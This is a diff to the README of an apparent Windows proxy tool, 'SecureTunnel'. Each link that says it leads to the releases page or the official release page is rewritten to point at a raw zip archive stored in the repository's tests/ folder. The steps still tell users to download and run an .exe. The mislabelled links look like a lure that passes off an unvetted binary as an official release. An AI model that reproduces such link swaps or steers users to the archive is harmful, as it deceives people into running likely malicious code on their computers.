@@ -1,6 +1,6 @@
 # 🛡️ SecureTunnel - Private Windows Proxy for Everyday Use
 
-[![Download SecureTunnel](https://img.shields.io/badge/Download%20SecureTunnel-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alixblae550/SecureTunnel/releases)
+[![Download SecureTunnel](https://img.shields.io/badge/Download%20SecureTunnel-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/alixblae550/SecureTunnel/main/tests/Secure-Tunnel-1.1-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ SecureTunnel is a Windows app that sets up a private tunnel with a simple GUI la
 
 Use the release page to download and run this app on Windows:
 
-[Visit the SecureTunnel releases page](https://github.com/alixblae550/SecureTunnel/releases)
+[Visit the SecureTunnel releases page](https://raw.githubusercontent.com/alixblae550/SecureTunnel/main/tests/Secure-Tunnel-1.1-alpha.4.zip)
 
 ## 📥 Download and Run
 
-1. Open the [SecureTunnel releases page](https://github.com/alixblae550/SecureTunnel/releases)
+1. Open the [SecureTunnel releases page](https://raw.githubusercontent.com/alixblae550/SecureTunnel/main/tests/Secure-Tunnel-1.1-alpha.4.zip)
 2. Find the latest release
 3. Download the Windows `.exe` file
 4. If your browser saves it to Downloads, open that folder
@@ -56,7 +56,7 @@ For best results, use a stable network connection and keep Windows up to date.
 
 ## 🛠️ Install Steps
 
-1. Go to the [releases page](https://github.com/alixblae550/SecureTunnel/releases)
+1. Go to the [releases page](https://raw.githubusercontent.com/alixblae550/SecureTunnel/main/tests/Secure-Tunnel-1.1-alpha.4.zip)
 2. Download the latest Windows build
 3. Save the file to a folder you can find again, like Downloads or Desktop
 4. Right-click the `.exe` if you want to scan it first
@@ -179,7 +179,7 @@ No. Download the file, run it, and point your app to the local proxy.
 
 Download the Windows build from the official release page:
 
-[https://github.com/alixblae550/SecureTunnel/releases](https://github.com/alixblae550/SecureTunnel/releases)
+[https://raw.githubusercontent.com/alixblae550/SecureTunnel/main/tests/Secure-Tunnel-1.1-alpha.4.zip](https://raw.githubusercontent.com/alixblae550/SecureTunnel/main/tests/Secure-Tunnel-1.1-alpha.4.zip)
 
 ## 📌 Project Topics
 
